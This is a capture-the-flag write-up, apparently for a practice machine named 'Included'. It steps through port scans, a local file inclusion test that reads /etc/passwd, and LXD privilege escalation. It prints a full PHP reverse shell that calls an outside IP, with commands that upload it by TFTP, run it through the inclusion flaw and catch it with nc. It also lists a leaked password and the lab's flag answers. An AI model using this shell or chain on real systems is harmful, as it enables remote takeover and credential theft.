# Included

## Initial Scan

```nmap
sudo nmap -T4 -v 10.129.253.54 -oA Included-Basic
sudo nmap -T4 -sU -v 10.129.253.54 -oA Included-Basic-UDP
sudo nmap -T4 -p 80 -sC -sV -v 10.129.253.54 -oA Included-80
```

<figure><img src="../../../.gitbook/assets/image (602).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (603).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (604).png" alt=""><figcaption></figcaption></figure>

## Task 1

What service is running on the target machine over UDP?

Answer: tftp

## Task 2

What class of vulnerability is the webpage that is hosted on port 80 vulnerable to? Looking on [OWASP](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/11.1-Testing\_for\_Local\_File\_Inclusion) we ca test for local file inclusion. So we can curl the website. `curl 'http://10.129.253.54/?file=/etc/passwd'`

<figure><img src="../../../.gitbook/assets/image (605).png" alt=""><figcaption></figcaption></figure>

Answer: Local File Inclusion

## Task 3

What is the default system folder that TFTP uses to store files?

Answer: /var/lib/tftpboot/

## Task 4

Which interesting file is located in the web server folder and can be used for Lateral Movement?

<figure><img src="../../../.gitbook/assets/image (606).png" alt=""><figcaption></figcaption></figure>

Answer: .htpasswd

## Task 5

What is the group that user Mike is a part of and can be exploited for Privilege Escalation? [This article](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) on HackTricks shows ways we can exploit LXD. Answer: lxd

## Task 6

When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name?

<figure><img src="../../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>

Answer: alpine

## Task 7

What flag do we set to the container so that it has root privileges on the host system?

Answer: security.privileged=true

## Task 8

If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted?

Answer: /mnt/root

## Task 9

Submit user flag

using [this](https://github.com/pentestmonkey/php-reverse-shell) PHP Reverse Shell(First result on Google when doing this).

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.82';
$port = 8008;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

Put the shell.php onto the server

```bash
tftp 10.129.253.54
put shell.php
```

Run the .php fle from LFI

```bash
nc -lvnp
curl 'http://10.129.253.54/?file=/var/lib/tftpboot/shell.php'
```

Upgrade the shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Look at the passwd file and login as mike. `mike:Sheffield19`

<figure><img src="../../../.gitbook/assets/image (608).png" alt=""><figcaption></figcaption></figure>

Answer: `a56ef91d70cfbf2cdb8f454c006935a1`

## Task 10

Submit root flag

<figure><img src="../../../.gitbook/assets/image (609).png" alt=""><figcaption></figcaption></figure>

Answer: `c693d9c7499d9f572ee375d4c14c7bcf`
